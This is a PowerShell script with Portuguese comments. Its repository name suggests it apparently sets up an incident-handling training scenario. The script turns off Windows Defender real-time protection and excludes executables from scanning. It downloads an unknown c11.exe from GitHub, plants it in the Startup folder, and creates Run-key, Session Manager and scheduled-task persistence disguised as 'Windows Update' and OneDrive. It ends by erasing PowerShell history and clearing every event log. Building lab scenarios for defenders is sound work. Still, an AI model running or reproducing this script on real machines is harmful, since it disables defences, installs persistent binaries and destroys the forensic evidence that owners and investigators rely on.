Set-MpPreference -ExclusionExtension ".exe"
Set-MpPreference -DisableRealtimeMonitoring $true

$url = "https://github.com/jovair1994/Incident_Handling_Deploy/raw/main/c11.exe"
$d = "C:\Windows\Temp\c11.exe"

Invoke-WebRequest -Uri $url -OutFile $d

copy "C:\Windows\Temp\c11.exe" "C:\Users\hardening\AppData\Roaming\"

copy "C:\Windows\Temp\c11.exe" "C:\Users\hardening\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\c11.exe"

Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -OutFile "C:\users\$env:USERNAME\Downloads\SysinternalsSuite.zip"

New-Item -ItemType Directory -Path "$env:USERPROFILE\Desktop\Ferramentas"

Expand-Archive -Path "C:\users\$env:USERNAME\Downloads\SysinternalsSuite.zip" -DestinationPath "$env:USERPROFILE\Desktop\Ferramentas"

Chave de registro HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Update
$registryPath1 = "HKLM:\System\CurrentControlSet\Control\Session Manager\Update"
$registryValue1 = "C:\Windows\Temp\OneDrive.exe"
New-Item -Path $registryPath1 -Force
Set-ItemProperty -Path $registryPath1 -Name "Update" -Value $registryValue1

Chave de registro HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update
$registryPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$registryValue2 = "C:\Users\hardening\AppData\Roaming\OneDrive.exe"
Set-ItemProperty -Path $registryPath2 -Name "Windows Update" -Value $registryValue2

Defina o caminho para o arquivo que vocÃª deseja executar
$filePath = "C:\Windows\Temp\OneDrive.exe"

Nome das tarefas agendadas
$taskName1 = "Sqm-Update"
$taskName2 = "Windows Update"

Crie a tarefa agendada Sqm-Update
Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "$filePath") -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName $taskName1

Crie a tarefa agendada Windows Update
Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "$filePath") -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName $taskName2

Clear-History

Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

Restart-Computer
